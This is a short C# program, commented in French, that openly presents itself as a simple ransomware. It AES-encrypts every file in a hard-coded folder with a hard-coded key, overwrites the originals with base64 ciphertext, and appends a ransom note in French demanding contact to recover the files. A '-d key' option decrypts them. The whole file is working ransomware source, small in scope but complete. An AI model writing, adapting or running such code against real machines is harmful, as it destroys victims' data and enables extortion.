/*
 * RANSOMWARE simple :
 * A l'exécution chiffre les fichiers du répertoire testFolder
 * A l'exécution avec les arguments -d key rétablit les fichiers du répertoire testFolder
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace SimpleRansomware
{
    class Program
    {
        // PROPRIETES
        private string testFolder = "D:\\test";
        private string key = "random_key";
        private string message = "\nVOS FICHIERS ONT ETE CHIFFRES !!! CONTACTER XXX POUR RECUPERER VOS FICHIERS !";

        // CONSTRUCTEUR
        public Program()
        {
        }

        // METHODES
        // Méthode Main d'entrée du programme
        public static void Main(string[] args)
        {
            Program program = new Program();
            if (args.Length == 2 && args[0] == "-d" && !string.IsNullOrEmpty(args[1]))
            {
                // Decryptage
                program.Run(false, args[1]);
            }
            else
            {
                // Cryptage (par défaut)
                program.Run(true);
            }
        }

        private void Run(bool a_isEncrypt, string a_key = null)
        {
            try
            {
                if (a_isEncrypt)
                {
                    Encrypt();
                }
                else
                {
                    Decrypt(a_key);
                }
            }
            catch (Exception)
            {
                // Echec...tant pis...
            }
        }

        private void Encrypt()
        {
            string[] files = Directory.GetFiles(testFolder);
            foreach (var file in files)
            {
                EncryptSingleFile(file);                
            }
        }

        private void EncryptSingleFile(string a_file)
        {
            byte[] data = File.ReadAllBytes(a_file);

            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.Close();
                    }
                    string encyptedData = Convert.ToBase64String(ms.ToArray());
                    File.WriteAllText(a_file, encyptedData + message);
                }
            }
        }

        private void Decrypt(string a_key)
        {
            string[] files = Directory.GetFiles(testFolder);
            foreach (var file in files)
            {
                DecryptSingleFile(file, a_key);
            }
        }

        private void DecryptSingleFile(string a_file, string a_key)
        {
            string data = File.ReadAllText(a_file);
            data = data.Substring(0, data.Length - message.Length);
            byte[] decryptedData = Convert.FromBase64String(data);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(a_key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(decryptedData, 0, decryptedData.Length);
                        cs.Close();
                    }
                    File.WriteAllBytes(a_file, ms.ToArray());
                }
            }
        }

    }
}